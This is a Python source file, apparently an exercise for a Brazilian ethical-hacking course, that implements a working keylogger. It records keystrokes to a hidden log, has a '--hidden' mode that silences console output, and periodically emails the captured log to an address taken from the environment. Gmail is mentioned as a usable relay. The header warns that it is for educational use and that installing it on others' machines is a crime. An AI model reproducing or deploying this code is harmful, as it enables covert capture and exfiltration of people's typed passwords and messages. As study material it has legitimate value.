#!/usr/bin/env python3
"""
KEYLOGGER SIMULADO — desafio DIO (Ethical Hacking / Cibersegurança).

⚠️⚠️  USO EXCLUSIVAMENTE EDUCACIONAL ⚠️⚠️
- Capture teclas APENAS em máquina sua e para aprender como a ameaça funciona.
- Instalar isto em máquina de terceiros sem consentimento é CRIME
  (Brasil: art. 154-A do Código Penal; lei 12.737/2012).
- Sem persistência, sem ocultação de processo, sem evasão de antivírus.

Mecânica didática implementada:
1. Captura teclas (pynput) e grava em arquivo de log
2. "Furtividade didática": roda sem console (pythonw) e log oculto
3. ENVIO AUTOMÁTICO do log por e-mail a cada N teclas (SMTP por variáveis
   de ambiente — nenhuma credencial no código)

Variáveis de ambiente:
  KEYLOG_PATH      caminho do log (padrão: lab/.keylog.txt)
  KEYLOG_SEND_EVERY envia a cada N teclas (0 desativa; padrão 0)
  SMTP_HOST/SMTP_PORT  servidor de e-mail (padrão 127.0.0.1:1025 — lab)
  SMTP_USER/SMTP_PASS  opcionais (STARTTLS; ex.: Gmail com app password)
  MAIL_FROM/MAIL_TO    remetente/destinatário (padrões de laboratório)

Tecla ESC encerra a captura.
"""
import os
import smtplib
import sys
from datetime import datetime
from email.message import EmailMessage
from pathlib import Path

from pynput import keyboard

REPO_ROOT = Path(__file__).resolve().parent.parent
LOG_PATH = Path(os.environ.get("KEYLOG_PATH", REPO_ROOT / "lab" / ".keylog.txt"))
SEND_EVERY = int(os.environ.get("KEYLOG_SEND_EVERY", "0"))
SMTP_HOST = os.environ.get("SMTP_HOST", "127.0.0.1")
SMTP_PORT = int(os.environ.get("SMTP_PORT", "1025"))
SMTP_USER = os.environ.get("SMTP_USER", "")
SMTP_PASS = os.environ.get("SMTP_PASS", "")
MAIL_FROM = os.environ.get("MAIL_FROM", "keylogger@lab.local")
MAIL_TO = os.environ.get("MAIL_TO", "vitima@lab.local")

HIDDEN = "--hidden" in sys.argv
contador = {"n": 0, "envios": 0}


def registrar(texto: str) -> None:
    LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(texto)


def ao_teclar(tecla) -> None:
    try:
        registrar(tecla.char)  # teclas imprimíveis
    except AttributeError:
        registrar(f"[{tecla.name.upper()}]")  # especiais: ESC, SPACE, ENTER...

    contador["n"] += 1
    if SEND_EVERY and contador["n"] % SEND_EVERY == 0:
        enviar_log()
    if tecla == keyboard.Key.esc:
        if not HIDDEN:
            print("[*] ESC — encerrando keylogger (simulação).")
        return False  # encerra o Listener


def enviar_log() -> None:
    if not LOG_PATH.exists():
        return
    corpo = LOG_PATH.read_text(encoding="utf-8", errors="replace")
    if not corpo.strip():
        return

    msg = EmailMessage()
    msg["Subject"] = f"[SIMULAÇÃO] keylog {datetime.now():%Y-%m-%d %H:%M:%S}"
    msg["From"] = MAIL_FROM
    msg["To"] = MAIL_TO
    msg.set_content(corpo)

    if not SMTP_HOST:
        # sem servidor configurado: salva .eml local (modo seco)
        destino = LOG_PATH.with_suffix(".eml")
        destino.write_bytes(bytes(msg))
        print(f"[+] SMTP vazio -> e-mail salvo em {destino}")
        return

    with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=10) as s:
        if SMTP_USER and SMTP_PASS:
            s.starttls()
            s.login(SMTP_USER, SMTP_PASS)
        s.send_message(msg)
    contador["envios"] += 1
    print(f"[+] envio #{contador['envios']}: log ({len(corpo)} chars) -> {SMTP_HOST}:{SMTP_PORT}")
    LOG_PATH.write_text("", encoding="utf-8")  # limpa o que já foi enviado


def main() -> int:
    if HIDDEN:
        # "furtividade" didática: sem saída de console (rodar via pythonw)
        devnull = open(os.devnull, "w")
        sys.stdout = sys.stderr = devnull
    else:
        print(f"[*] keylogger simulado gravando em {LOG_PATH}")
        print(f"[*] envio automático a cada {SEND_EVERY or '∞ (desativado)'} teclas -> {SMTP_HOST}:{SMTP_PORT}")
        print("[*] ESC para encerrar.")
    with keyboard.Listener(on_press=ao_teclar) as listener:
        listener.join()
    return 0


if __name__ == "__main__":
    sys.exit(main())
